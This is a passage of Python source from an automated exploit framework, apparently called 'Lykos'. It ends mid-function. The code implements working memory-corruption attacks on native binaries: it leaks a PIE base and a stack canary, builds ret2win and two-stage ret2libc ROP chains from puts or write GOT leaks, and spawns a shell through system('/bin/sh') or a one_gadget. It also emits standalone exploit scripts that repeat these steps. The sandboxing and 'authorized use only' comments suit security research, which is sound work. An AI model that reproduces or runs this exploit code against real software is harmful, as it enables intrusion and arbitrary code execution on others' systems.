"""PIE exploitation via a runtime info-leak (Phase 9 frontier, analyst-in-the-loop).

A PIE binary loads at a randomized base, so static addresses are useless until a runtime
**info-leak** reveals a real address. This drives the target interactively in ONE process
(defeating live ASLR): read the leaked address from its output, compute the load base, send a
payload whose addresses are relocated to that base, and verify the exploit by an observable
success marker. The analyst supplies what the target leaks and how success shows (doc 15).
"""
from __future__ import annotations

import logging
import os
import re
import select
import struct
import subprocess
import time
from pathlib import Path

from ... import observe
from ..dynamic import sandbox

_log = logging.getLogger(__name__)


def _kill(p):
    # Close the pipes FIRST so a half-filled stdin BufferedWriter does not raise an *unraisable*
    # BrokenPipeError when it is later GC'd and tries to flush to a process we just killed (a target
    # that exits mid-leak makes this the common case; pytest turns the unraisable into a warning).
    for stream in (getattr(p, "stdin", None), getattr(p, "stdout", None)):
        try:
            if stream is not None:
                stream.close()
        except Exception:                                    # noqa: BLE001
            pass
    try:
        os.killpg(os.getpgid(p.pid), 9)
    except OSError:
        try:
            p.kill()
        except OSError:
            pass


def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset=None,
                     payload_for_base, success_regex: str, timeout: float = 8.0,
                     mem_mb: int = 2048, base_from_leaks=None, leak_trigger: bytes = b"",
                     shell_probe: bytes = b"", run_wrapper=None, run_env=None) -> dict:
    """Interactive single-process leak → relocate → exploit over stdin/stdout.

    Two ways to turn the leak into an image base:
      - `leak_base_offset` (analyst-gated): the static offset of the single symbol the target
        leaks, so base = leaked - leak_base_offset.
      - `base_from_leaks` (automatic): a callback given EVERY hex value in the leak burst that
        returns the recovered base (e.g. `exploit.recover_pie_base` bound to the target bytes),
        so the analyst need not say which symbol is leaked.
    `payload_for_base(base)->bytes` builds the relocated payload. Success = `success_regex`
    appears in the post-payload output.

    `shell_probe` is a command to send AFTER the payload, for the case the hijack lands in a
    `win()` that execve's a shell -- by far the commonest shape. Such a win prints NOTHING of its
    own, so a marker regex can never match it, and this function made that unobservable twice
    over: it closed stdin right after the payload, so the shell it had just spawned read EOF and
    exited without ever running anything. With a probe, stdin stays open, the command goes in,
    and the caller grades the reply (`attribution.CodeMarkers.proves`, which an echoing target
    cannot fake). The only thing that changes without a probe is nothing at all.

    `run_wrapper` is a command prefix the target is launched behind (e.g. `[qemu-aarch64]` for an
    EMULATED foreign-CPU target, so the same leak -> relocate -> exploit loop defeats a non-x86
    PIE's runtime-randomised load base under qemu-user); `run_env` adds environment variables the
    wrapper needs (e.g. `QEMU_LD_PREFIX` so a dynamically linked foreign ELF finds its loader).
    Both default to None -- a native x86-64 target is spawned exactly as before.
    """
    if leak_base_offset is None and base_from_leaks is None:
        raise ValueError("leak_and_exploit needs exactly one of leak_base_offset= "
                         "or base_from_leaks= (got neither)")
    rx = re.compile(leak_regex.encode("latin-1"))
    ok = re.compile(success_regex.encode("latin-1"))
    # ASLR ON, uniquely among this file's harnesses. This function's whole contract is leak ->
    # relocate -> exploit: the payload is computed from the base THIS process disclosed, so it
    # needs no fixed address and a randomized child is the only honest test of the claim it
    # files ("defeated ASLR"). The others here stay as they are on purpose -- some are not
    # leak-relative (a stack-address shellcode chain), and switching them blind would trade a
    # working capability for a cosmetic one.
    preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True, aslr=True)
    # The leak harness reads only the target's stdout, so it needs no control channel: contain
    # it fully (read-only fs, tmpfs, private pid + network namespace) when bwrap is available.
    exedir = str(Path(exe).resolve().parent)
    # An emulated target is launched behind `run_wrapper` (the qemu-user binary); the host
    # read-only bind in isolate_prefix makes that binary and the guest loader reachable inside the
    # sandbox, and `run_env` (QEMU_LD_PREFIX) is inherited through bwrap. A native target gets an
    # empty wrapper -- the exact command as before.
    #
    # aslr=True: this harness's whole contract is to defeat LIVE randomization, so it must NOT get
    # the default `setarch -R` that isolate_prefix injects inside the namespace (which pinned the
    # child at a fixed base and made "defeated ASLR" a claim against a static layout -- and, for an
    # emulated target, pinned qemu-user's guest base too). With it left on the load base varies
    # run-to-run and the base this files is genuinely recovered from the leak. Mirrors the
    # `_rlimits(aslr=True)` already set below.
    cmd = sandbox.isolate_prefix(exedir, net=False, aslr=True) + \
        list(run_wrapper or ()) + [str(exe)] + [str(a) for a in base_argv]
    _env = None
    if run_env:
        _env = dict(os.environ)
        _env.update(run_env)
    try:
        p = subprocess.Popen(cmd,
                             stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, start_new_session=True,
                             env=_env, preexec_fn=preexec)
    except Exception as e:
        return {"ok": False, "reason": f"spawn failed: {e!r}"}

    if leak_trigger:                             # a format-string leak must be PROVOKED: send the
        try:                                     # %p dump first, then read the pointers it prints
            p.stdin.write(leak_trigger)
            p.stdin.flush()
        except (BrokenPipeError, OSError):
            pass

    def _vals(b):
        out = []
        for m in rx.finditer(b):
            grp = m.group(1) if m.groups() else m.group(0)
            try:
                out.append(int(grp, 16))
            except ValueError:
                pass
        # Auto base recovery also consumes a RAW over-read: a write(fd,buf,BIG)/puts spills stack
        # memory as binary words (no hex text), which the regex never sees. recover_pie_base /
        # recover_libc_base corroborate across these, so harvest them alongside the hex.
        if base_from_leaks is not None:
            out += _le_pointer_words(b)
        return out

    deadline = time.time() + timeout
    buf = b""
    leaked = None
    last_data = time.time()
    try:
        while time.time() < deadline:
            r, _, _ = select.select([p.stdout], [], [], 0.2)
            if r:
                chunk = os.read(p.stdout.fileno(), 4096)
                if not chunk:
                    break
                buf += chunk
                last_data = time.time()
                # a hex match, or (auto mode) a raw over-read word, means the burst has started
                if rx.search(buf) or (base_from_leaks is not None and _le_pointer_words(buf)):
                    leaked = True
                    # a format-string leak prints its whole burst at once, then the target
                    # blocks on our payload read (no EOF, no exit) -- so once something matched,
                    # stop after a brief quiet gap rather than spinning to the deadline.
                    if base_from_leaks is None:
                        break
            elif p.poll() is not None:
                break
            elif leaked and (time.time() - last_data) > 0.3:
                break                                    # burst captured; target now awaits input
        vals = _vals(buf)
        if not vals:
            _kill(p)
            return {"ok": False, "reason": "no leak matched before the target read input",
                    "output": buf[:400].decode("latin-1", "ignore")}

        if base_from_leaks is not None:
            base = base_from_leaks(vals)
            if not base:
                _kill(p)
                return {"ok": False, "reason": "could not recover the image base from the leak",
                        "leaked": vals[:8], "output": buf[:400].decode("latin-1", "ignore")}
        else:
            base = vals[0] - leak_base_offset
        leaked = base + leak_base_offset if base_from_leaks is None else vals[0]
        payload = payload_for_base(base)
        sent_at = len(buf)          # only output AFTER this can confirm the RELOCATED payload worked
        try:
            p.stdin.write(payload)
            p.stdin.flush()
            if shell_probe:
                # KEEP stdin open and feed the probe. Closing it is right when the win prints a
                # marker and wrong when the win IS a shell: that shell inherits this pipe, and an
                # immediate EOF is an immediate exit with nothing on stdout.
                time.sleep(0.3)                          # let the hijack land and exec
                # A LEADING newline, because the payload is padded. `ret2win_input` fills to a
                # fixed length after the return address, and those filler bytes are still in the
                # pipe when the hijacked process execs a shell -- which reads them as the start
                # of its first line, so the probe arrived as `CCCCCCecho ...` and came back
                # `sh: 1: CCCCCCecho: not found` **[measured]**. The shell was real and the
                # evidence was unreadable, which grades as "the marker was not observed" -- the
                # same verdict as no shell at all. One newline ends the junk line.
                p.stdin.write(b"\n" + (shell_probe if shell_probe.endswith(b"\n")
                                       else shell_probe + b"\n"))
                p.stdin.flush()
            else:
                p.stdin.close()
        except (BrokenPipeError, OSError):
            pass

        out = buf
        # A FRESH budget for the confirmation read: the leak may have arrived just before `deadline`,
        # which would otherwise leave this loop zero iterations and miss a genuine success marker.
        post_deadline = time.time() + timeout
        while time.time() < post_deadline:
            r, _, _ = select.select([p.stdout], [], [], 0.2)
            if r:
                chunk = os.read(p.stdout.fileno(), 4096)
                if not chunk:
                    break
                out += chunk
            elif p.poll() is not None:
                break
        # Search ONLY the post-payload bytes: a success_regex that merely appears in the target's
        # normal startup/leak output (pre-payload) must not declare a false "demonstrated".
        return {"ok": True, "leaked": leaked, "base": base,
                "success": bool(ok.search(out[sent_at:])),
                "output": out[:800].decode("latin-1", "ignore")}
    finally:
        _kill(p)
        try:
            p.wait(timeout=2)
        except Exception:
            observe.absorbed(_log, "continuing")


def render_pie_leak_script(*, leak_regex, offset, leak_trigger, win_off=0, segments=None,
                           named_leak_off=None, anchors=None, pre=b"", suf=b"", loop_feed=b"",
                           shell=True, success_regex=None) -> bytes:
    """Self-contained reproducer for a PIE L3 defeated by a runtime info-leak. A PIE payload is
    base-specific, so no static input can exist: the script sends the confirmed `leak_trigger`,
    reads the leaked pointer(s), recovers the image base, relocates the payload and sends it --
    exactly as `_pie_leak_exploit` confirmed. (Auto mode used to ship a static payload that could
    never re-hijack a freshly randomized base.)

    The payload is either a plain ret2win (`win_off`: `cyclic(offset) + base+win_off`) or an
    arbitrary `segments` template -- a list of `["const", hex]` / `["rel", off]` pieces, where a
    `rel` piece renders as an 8-byte `base + off` -- which carries any relocated ROP chain
    (mprotect+shellcode, ret2plt, ...) with no per-exploit script. Base recovery mirrors the live
    path: subtract `named_leak_off` when a symbol was named, else corroborate across the baked
    `anchors` (>=2 leaked slots, like `exploit.recover_pie_base`). `pre`/`suf` are L2's framing;
    `loop_feed` satisfies a re-entry read. Grades by a nonce challenge a spawned shell evaluates
    (`shell`), or an analyst `success_regex`."""
    grade = ("ok = (b'LYKOS_SHELL_%d' % (a*b)) in out"
             if shell else f"ok = re.search({success_regex!r}.encode(), out) is not None")
    build_payload = ("b''.join(x[1] if x[0]=='const' else q(base+x[1]) for x in SEGMENTS)"
                     if segments is not None else "cyclic(OFF) + q(base + WIN_OFF)")
    seg_literal = [[k, (v.hex() if k == "const" else int(v))] for k, v in (segments or [])]
    return (
        "#!/usr/bin/env python3\n"
        "# Lykos L3 reproducer: PIE ret2win via a runtime info-leak. Authorized use only.\n"
        "# RUN IN A SANDBOX/VM -- this executes an untrusted binary and may spawn a shell.\n"
        "import os, random, re, select, struct, subprocess, sys, time\n"
        "q = lambda v: struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)\n"
        "EXE = sys.argv[1] if len(sys.argv) > 1 else './target.bin'\n"
        f"OFF={offset}; WIN_OFF={win_off:#x}; RX={leak_regex!r}\n"
        f"NAMED_OFF={named_leak_off if named_leak_off is None else hex(named_leak_off)}\n"
        f"ANCHORS={anchors if anchors is not None else '{}'!r}\n"
        f"RAW_SEGMENTS={seg_literal!r}\n"
        "SEGMENTS=[(k, bytes.fromhex(v)) if k=='const' else (k, v) for k, v in RAW_SEGMENTS]\n"
        f"TRIG={bytes(leak_trigger or b'')!r}; PRE={bytes(pre)!r}; SUF={bytes(suf)!r}; "
        f"FEED={bytes(loop_feed or b'')!r}\n"
        "def read_until(p, deadline, quiet=0.3):\n"
        "    out, last = b'', time.time()\n"
        "    while time.time() < deadline:\n"
        "        r, _, _ = select.select([p.stdout], [], [], 0.1)\n"
        "        if r:\n"
        "            c = os.read(p.stdout.fileno(), 4096)\n"
        "            if not c: break\n"
        "            out, last = out + c, time.time()\n"
        "        elif p.poll() is not None: break\n"
        "        elif out and time.time() - last > quiet: break\n"
        "    return out\n"
        "def recover(vals):\n"
        "    if NAMED_OFF is not None:\n"
        "        return next((b for b in (v - NAMED_OFF for v in vals) if b > 0 and b % 0x1000 == 0), None)\n"
        "    sup = {}\n"
        "    for v in set(vals):\n"
        "        for va in ANCHORS.get(v & 0xfff, []):\n"
        "            b = v - va\n"
        "            if b > 0 and b % 0x1000 == 0: sup.setdefault(b, set()).add(v)\n"
        "    b = max(sup, key=lambda k: len(sup[k]), default=None)\n"
        "    return b if (b and len(sup[b]) >= 2) else None\n"
        "def cyclic(n):\n"
        "    a = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'\n"
        "    return bytes((a*(n//len(a)+1))[:n])\n"
        "for _ in range(4):\n"
        "    p = subprocess.Popen([EXE], stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n"
        "                         stderr=subprocess.STDOUT)\n"
        "    time.sleep(0.2)\n"
        "    if TRIG: p.stdin.write(TRIG); p.stdin.flush()\n"
        "    buf = read_until(p, time.time() + 3)\n"
        "    vals = [int(m.group(1) if m.groups() else m.group(0), 16) for m in re.finditer(RX.encode(), buf)]\n"
        "    if NAMED_OFF is None:\n"            # auto: a raw over-read spills pointers as BINARY, not hex
        "        for i in range(max(0, len(buf) - 7)):\n"
        "            if buf[i+6] == 0 and buf[i+7] == 0 and 0x10 <= buf[i+5] <= 0x7f:\n"
        "                vals.append(int.from_bytes(buf[i:i+8], 'little'))\n"
        "    base = recover(vals)\n"
        "    if not base: p.kill(); continue\n"
        "    print('leaked image base %#x' % base)\n"
        f"    payload = PRE + ({build_payload}) + SUF\n"
        "    a, b = random.randint(1000, 9999), random.randint(1000, 9999)\n"
        # A write may BrokenPipe when the win exits (a flag-printer _exit()s; only a shell keeps
        # reading) -- tolerate it and still read+grade what came back, don't abandon the attempt.
        "    try:\n"
        "        p.stdin.write(payload); p.stdin.flush(); time.sleep(0.2)\n"
        "        if FEED: p.stdin.write(FEED); p.stdin.flush()\n"
        f"        if {bool(shell)}: p.stdin.write(b'echo LYKOS_SHELL_$((%d*%d))\\n' % (a, b)); p.stdin.flush()\n"
        "    except (BrokenPipeError, OSError): pass\n"
        "    out = read_until(p, time.time() + 6, quiet=1.5)\n"
        f"    {grade}\n"
        "    if ok:\n"
        "        sys.stdout.write(out.decode('latin-1', 'ignore'))\n"
        "        print('\\n[+] PIE base recovered, relocated payload reached its target -- reproduced'); sys.exit(0)\n"
        "    p.kill()\n"
        "print('[-] PIE exploit did not confirm'); sys.exit(1)\n"
    ).encode()


# Back-compat alias: the ret2win filer calls this name; the generalised body handles both.
def render_pie_ret2win_script(**kw) -> bytes:
    return render_pie_leak_script(**kw)


def render_canary_script(*, canary_offset, ret_offset, canary_trigger, pop_rdi, puts_plt, puts_got,
                          ret_to, puts_off, system_off, binsh_off, ret_gadget=None, loop_feed=None,
                          canary_regex=r"0x[0-9a-fA-F]+", canary_index=None) -> bytes:
    """A self-contained, stdlib-based reproducer for a ret2libc PAST A STACK CANARY (no-PIE). The
    canary is per-process random, so a static input cannot exist -- the script LEAKS it at runtime,
    writes it back, does a two-stage puts leak to defeat ASLR, then system("/bin/sh"). All binary
    offsets are static (no-PIE); the libc base is recovered live, so the script is portable."""
    feed = loop_feed if loop_feed is not None else canary_trigger
    return (
        "#!/usr/bin/env python3\n"
        "# Lykos L3 reproducer: ret2libc past a stack canary. Authorized-use only.\n"
        "import os, random, re, select, struct, subprocess, sys, time\n"
        "EXE = sys.argv[1] if len(sys.argv) > 1 else './target.bin'\n"
        f"CANARY_OFF={canary_offset}; RET_OFF={ret_offset}\n"
        f"TRIGGER={canary_trigger!r}; FEED={feed!r}\n"
        f"POP_RDI={pop_rdi:#x}; PUTS_PLT={puts_plt:#x}; PUTS_GOT={puts_got:#x}; RET_TO={ret_to:#x}\n"
        f"PUTS_OFF={puts_off:#x}; SYSTEM_OFF={system_off:#x}; BINSH_OFF={binsh_off:#x}\n"
        f"RET_GADGET={ret_gadget if ret_gadget else 0:#x}; REGEX={canary_regex!r}; "
        f"IDX={canary_index if canary_index is not None else 'None'}\n"
        "def q(v): return struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)\n"
        "def read_until(p, deadline, quiet=0.3):\n"
        "    out=b''; last=time.time()\n"
        "    while time.time()<deadline:\n"
        "        r,_,_=select.select([p.stdout],[],[],0.1)\n"
        "        if r:\n"
        "            c=os.read(p.stdout.fileno(),4096)\n"
        "            if not c: break\n"
        "            out+=c; last=time.time()\n"
        "        elif p.poll() is not None: break\n"
        "        elif out and (time.time()-last)>quiet: break\n"
        "    return out\n"
        "def find_canary(vals):\n"
        "    for v in vals:\n"
        "        if v&0xFF or v>>8==0 or v<0x1000000000000: continue\n"
        "        if 0x550000000000<=v<=0x5FFFFFFFFFFF or 0x7F0000000000<=v<=0x7FFFFFFFFFFF: continue\n"
        "        return v\n"
        "    return None\n"
        "def prefix(c): return b'A'*CANARY_OFF + q(c) + b'B'*max(0, RET_OFF-CANARY_OFF-8)\n"
        "for align in ((None, RET_GADGET) if RET_GADGET else (None,)):\n"
        "  for _ in range(3):\n"
        "    p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
        "    read_until(p, time.time()+0.5)\n"
        "    p.stdin.write(TRIGGER); p.stdin.flush()\n"
        "    dump=read_until(p, time.time()+3)\n"
        "    vals=[int(m.group(0),16) for m in re.finditer(REGEX.encode(),dump)]\n"
        # A buffer OVER-READ leaks the canary as a RAW little-endian word (no hex text): harvest
        # CANARY-SHAPED words -- low byte 0x00, byte 1 non-zero, >=5 non-zero bytes (high entropy),
        # not a pointer. A naive every-8-bytes harvest hands find_canary a mostly-zero garbage word
        # it wrongly accepts, so the write-back trips __stack_chk_fail (`*** stack smashing`).\n"
        "    for i in range(max(0,len(dump)-7)):\n"
        "        wb=dump[i:i+8]\n"
        "        if wb[0]!=0 or wb[1]==0 or sum(1 for x in wb if x)<5: continue\n"
        "        w=int.from_bytes(wb,'little')\n"
        "        if 0x550000000000<=w<=0x5FFFFFFFFFFF or 0x7F0000000000<=w<=0x7FFFFFFFFFFF: continue\n"
        "        vals.append(w)\n"
        "    canary = vals[IDX] if (IDX is not None and -len(vals)<=IDX<len(vals)) else find_canary(vals)\n"
        "    if canary is None: p.kill(); continue\n"
        "    pre=prefix(canary)\n"
        "    p.stdin.write(pre+q(POP_RDI)+q(PUTS_GOT)+q(PUTS_PLT)+q(RET_TO)); p.stdin.flush()\n"
        "    burst=read_until(p, time.time()+3); raw=burst.split(b'\\n',1)[0][:6]\n"
        "    if len(raw)<6: p.kill(); continue\n"
        "    base=int.from_bytes(raw.ljust(8,b'\\x00'),'little')-PUTS_OFF\n"
        "    if base<=0 or base&0xFFF: p.kill(); continue\n"
        "    p.stdin.write(FEED); p.stdin.flush(); read_until(p, time.time()+0.4)\n"
        "    s2=bytearray(pre)+(q(align) if align else b'')+q(POP_RDI)+q(base+BINSH_OFF)+q(base+SYSTEM_OFF)\n"
        "    ca, cb = random.randint(1000, 9999), random.randint(1000, 9999)\n"
        # A real shell EVALUATES $((ca*cb)); a target echoing stdin prints the literal form, so the
        # check is forgery-proof -- unlike the old fixed `echo PWNED-LYKOS`, which an echo reflected.
        "    try:\n"
        "        p.stdin.write(bytes(s2)); p.stdin.flush(); time.sleep(0.3)\n"
        "        p.stdin.write(b'echo LYKOS_SHELL_$((%d*%d))\\n' % (ca, cb)); p.stdin.flush()\n"
        "    except (BrokenPipeError, OSError): p.kill(); continue\n"
        "    out=read_until(p, time.time()+6, quiet=1.5)\n"
        "    if (b'LYKOS_SHELL_%d' % (ca*cb)) in out:\n"
        "        sys.stdout.write(out.decode('latin-1','ignore'))\n"
        "        print('\\n[+] canary %#x bypassed, libc base %#x, shell evaluated the challenge'%(canary,base)); "
        "sys.exit(0)\n"
        "    p.kill()\n"
        "print('[-] canary ret2libc did not confirm'); sys.exit(1)\n"
    ).encode()


# --- ret2libc WITH a runtime puts() leak -------------------------------------------------------
def _read_until(p, deadline, quiet=0.3):
    """Read a target's merged stdout until it stalls (a quiet gap) or exits; returns the bytes."""
    out, last = b"", time.time()
    while time.time() < deadline:
        r, _, _ = select.select([p.stdout], [], [], 0.1)
        if r:
            chunk = os.read(p.stdout.fileno(), 4096)
            if not chunk:
                break
            out += chunk
            last = time.time()
        elif p.poll() is not None:
            break
        elif out and (time.time() - last) > quiet:
            break
    return out


def ret2libc_leak(exe, workdir, *, offset, pop_rdi, puts_plt, puts_got, ret_to,
                  puts_off, system_off, binsh_off, ret_gadget=None, one_gadgets=(),
                  base_argv=(), marker: bytes = b"LYKOS_R2L_9931", timeout: float = 8.0,
                  mem_mb: int = 2048, leaker: str = "puts", pop_rsi=None, pop_rdx=None,
                  write_plt=None, frame=None) -> dict:
    """Two-stage ret2libc that defeats ASLR with a puts() info-leak, confirmed by a spawned shell.

    Stage 1 (`build_leak_puts`) calls puts(puts@GOT), printing the libc address of puts as raw
    little-endian bytes, then returns to `ret_to` so the loop reads again. `resolve_libc_base`
    subtracts the symbol's offset to recover the libc base; stage 2 then re-triggers the overflow
    with a FINISHER that spawns a shell from the recovered base -- tried best-first:

      * `ret2libc`   -- `system("/bin/sh")` (a pop-rdi chain). Needs a 16-byte-aligned rsp, and the
                        re-entered frame's parity is environment-dependent, so it is tried with and
                        without a `ret` pad on a fresh process each.
      * `one_gadget` -- a single libc address that `execve("/bin/sh", ...)` in one jump (from
                        `rop.find_one_gadgets`). No argument setup, so it wins exactly the cases
                        system() cannot: a bad stack parity, or a constraint the pop chain can't meet.

    `one_gadgets` are libc OFFSETS (relocated to base+offset at runtime). Success = the spawned
    shell EVALUATES the forgery-proof marker, which a crash, a wrong address, or a reflected input
    can never produce. `frame` wraps each OVERFLOW stage in the structure L2 measured around it
    (both stages re-enter the same parse). Returns {ok, base, leaked, align, technique, stage1}.
    """
    _f = frame or (lambda b: b)
    from . import attribution, rop
    # Forgery-proof confirmation: a bare `echo <marker>` is reflected verbatim by a target that
    # merely echoes stdin (no shell), so `marker in out` false-positives. The code markers embed
    # arithmetic + quote-stripping that ONLY a real shell resolves; an echo emits the raw form.
    markers = attribution.make_code_markers()
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]
    last_leaked = None

    def _sys_finisher(base, align):                      # system("/bin/sh")
        return rop.build_ret2system(offset, pop_rdi, base + binsh_off, base + system_off, 0,
                                    ret_gadget=align)

    def _one_gadget_finisher(og):                        # jump to base+og: execve("/bin/sh") in one
        def build(base, align):
            pad = struct.pack("<Q", ret_gadget) if (align and ret_gadget) else b""
            return bytes(bytearray(b"A" * offset) + pad + struct.pack("<Q", base + og))
        return build

    finishers = []                                       # (technique, build(base, align), og|None)
    if system_off is not None and binsh_off is not None:
        finishers.append(("ret2libc", _sys_finisher, None))
    for _og in one_gadgets or ():
        finishers.append(("one_gadget", _one_gadget_finisher(_og), _og))

    for tech, build_s2, fog in finishers:
        # stage-2 alignment: even parity (no pad), then odd (one `ret`); one of the two is aligned.
        for align in ([None, ret_gadget] if ret_gadget is not None else [None]):
            # A couple of tries per parity: the leak is one process, and a rare short read on stage
            # 1 is worth a retry before ruling the parity out.
            for _ in range(3):
                preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
                cmd = (sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir])
                       + [str(exe)] + argv)
                try:
                    p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                         stderr=subprocess.STDOUT, cwd=exedir,
                                         start_new_session=True, preexec_fn=preexec)
                except Exception as e:                    # noqa: BLE001
                    return {"ok": False, "reason": f"spawn failed: {e!r}"}
                try:
                    _read_until(p, time.time() + 0.5)     # drain the target's first prompt/banner
                    # Stage-1 leaker. write(1, got, 8) is the ROBUST path (exact 8 raw bytes, no NUL
                    # or format truncation) when the target exposes write() + pop rsi/rdx; puts/printf
                    # print the pointer until its trailing NUL (6 bytes). `write_plt` carries the
                    # write stub in the write case, else `puts_plt` is the puts/printf stub.
                    if leaker == "write" and pop_rsi and pop_rdx and write_plt:
                        s1 = rop.build_leak_write(offset, pop_rdi=pop_rdi, pop_rsi=pop_rsi,
                                                  pop_rdx=pop_rdx, got=puts_got, write_plt=write_plt,
                                                  ret_to=ret_to, ret_gadget=None)
                    else:
                        s1 = rop.build_leak_puts(offset, pop_rdi=pop_rdi, got=puts_got,
                                                 puts_plt=puts_plt, ret_to=ret_to, ret_gadget=None)
                    s1 = _f(s1)
                    try:
                        p.stdin.write(s1)
                        p.stdin.flush()
                    except (BrokenPipeError, OSError):
                        continue
                    burst = _read_until(p, time.time() + timeout / 2)
                    if leaker == "write":
                        raw = burst[:8]                   # write() emits exactly 8 raw bytes
                    else:
                        raw = burst.split(b"\n", 1)[0][:6]  # puts/printf: pointer up to its NUL
                    if len(raw) < 6:
                        continue
                    leaked = int.from_bytes(raw.ljust(8, b"\x00"), "little")
                    base = rop.resolve_libc_base(leaked, puts_off)
                    last_leaked = leaked
                    if not base:
                        continue                          # not the pointer we assumed; retry/parity
                    s2 = _f(build_s2(base, align))
                    try:
                        p.stdin.write(s2)
                        p.stdin.flush()
                        time.sleep(0.3)
                        p.stdin.write(markers.command + b"\n")
                        p.stdin.flush()
                    except (BrokenPipeError, OSError):
                        break                             # stage 2 killed the process: wrong parity
                    # A spawned shell may echo after a gap under the sandbox, so wait out a longer
                    # quiet window before concluding the marker never came.
                    out = _read_until(p, time.time() + timeout, quiet=1.5)
                    if markers.proves(out):               # a shell EVALUATED it, not an echo
                        r = {"ok": True, "base": base, "leaked": leaked, "align": align,
                             "technique": tech, "stage1": s1,
                             "output": out[:400].decode("latin-1", "ignore")}
                        if tech == "ret2libc":
                            r["system"], r["binsh"] = base + system_off, base + binsh_off
                        else:
                            r["one_gadget"] = base + fog
                        return r
                finally:
                    for stream in (p.stdin, p.stdout):    # close first: no buffered flush to a dead
                        try:                               # pipe raising an unraisable BrokenPipe
                            if stream is not None:
                                stream.close()
                        except Exception:                  # noqa: BLE001
                            pass
                    _kill(p)
                    try:
                        p.wait(timeout=2)
                    except Exception:                     # noqa: BLE001
                        pass
    return {"ok": False, "reason": "no shell confirmed (leak captured but no finisher spawned a "
                                   "shell under either stack alignment)", "leaked": last_leaked}


def pie_ret2libc_leak(exe, workdir, *, offset, leak_trigger, target_bytes, pop_rdi_off,
                      puts_plt_off, puts_got_off, ret_to_off, puts_libc_off, system_off, binsh_off,
                      ret_gadget_off=None, leaker="puts", pop_rsi_off=None, pop_rdx_off=None,
                      write_plt_off=None, one_gadget_offs=(), base_argv=(), timeout: float = 10.0,
                      mem_mb: int = 2048) -> dict:
    """PIE ret2libc defeating ASLR with TWO leaks in ONE process -- an honest defeat (it never
    assumes a fixed base).

      phase 0: a buffer OVER-READ (the `leak_trigger` fills the leak read) spills RETURN addresses;
               `recover_pie_base` pins the image base, and every binary address below is relocated
               by it. No format-string sink needed.
      stage 1: a base-relocated `puts(puts@GOT)` / `write(1, GOT, 8)` prints the libc address of the
               leaked symbol, then returns to `ret_to` (main) so the loop reads again.
      stage 2: `resolve_libc_base` -> `system("/bin/sh")` (or a one-gadget), after re-feeding the
               staging read the re-entered loop performs first.

    Every `*_off` binary address is an IMAGE offset (relocated by the recovered base); the libc
    `*_off` are offsets in the loading libc. Confirmed by a spawned shell that EVALUATES the
    forgery-proof marker (never an echo). system()'s rsp parity is environment-dependent, so both
    alignments are detonated on a fresh process each. Returns {ok, pie_base, libc_base, ...}."""
    from . import attribution, rop
    from .exploit import recover_pie_base
    markers = attribution.make_code_markers()
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]

    finishers = []                                       # (technique, one_gadget_off | None)
    if system_off is not None and binsh_off is not None:
        finishers.append(("ret2libc", None))
    finishers += [("one_gadget", og) for og in (one_gadget_offs or ())]
    aligns = [None, ret_gadget_off] if ret_gadget_off is not None else [None]
    last = {"ok": False, "reason": "no PIE base recovered from the over-read leak"}

    def _leak_base(p):
        try:
            p.stdin.write(leak_trigger); p.stdin.flush()
        except (BrokenPipeError, OSError):
            return None
        return recover_pie_base(_le_pointer_words(_read_until(p, time.time() + timeout / 2)),
                                target_bytes)

    for tech, fog in finishers:
        for align_off in aligns:
            for _ in range(2):                           # a short read on a stage is worth a retry
                preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
                cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
                try:
                    p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                         stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                                         preexec_fn=preexec)
                except Exception as e:                   # noqa: BLE001
                    return {"ok": False, "reason": f"spawn failed: {e!r}"}
                try:
                    _read_until(p, time.time() + 0.5)    # banner
                    base = _leak_base(p)                 # phase 0: recover the PIE image base
                    if not base:
                        continue
                    pop_rdi, ret_to, puts_got = base + pop_rdi_off, base + ret_to_off, base + puts_got_off
                    # stage 1: leak a libc pointer out of a GOT slot, return to the loop
                    if (leaker == "write" and pop_rsi_off is not None and pop_rdx_off is not None
                            and write_plt_off is not None):
                        s1 = rop.build_leak_write(offset, pop_rdi=pop_rdi, pop_rsi=base + pop_rsi_off,
                                                  pop_rdx=base + pop_rdx_off, got=puts_got,
                                                  write_plt=base + write_plt_off, ret_to=ret_to,
                                                  ret_gadget=None)
                    else:
                        s1 = rop.build_leak_puts(offset, pop_rdi=pop_rdi, got=puts_got,
                                                 puts_plt=base + puts_plt_off, ret_to=ret_to,
                                                 ret_gadget=None)
                    try:
                        p.stdin.write(s1); p.stdin.flush()
                    except (BrokenPipeError, OSError):
                        continue
                    burst = _read_until(p, time.time() + timeout / 2)
                    raw = burst[:8] if leaker == "write" else burst.split(b"\n", 1)[0][:6]
                    if len(raw) < 6:
                        continue
                    leaked = int.from_bytes(raw.ljust(8, b"\x00"), "little")
                    libc_base = rop.resolve_libc_base(leaked, puts_libc_off)
                    if not libc_base:
                        last = {"ok": False, "reason": "PIE base ok but libc leak unrecognised",
                                "pie_base": base, "leaked": leaked}
                        continue
                    # the loop re-enters: satisfy the staging (over-read) read, drain its echo
                    try:
                        p.stdin.write(leak_trigger); p.stdin.flush()
                    except (BrokenPipeError, OSError):
                        continue
                    _read_until(p, time.time() + 0.4)
                    align = (base + align_off) if align_off is not None else None
                    if tech == "ret2libc":
                        s2 = rop.build_ret2system(offset, pop_rdi, libc_base + binsh_off,
                                                  libc_base + system_off, 0, ret_gadget=align)
                    else:
                        pad = struct.pack("<Q", align) if align else b""
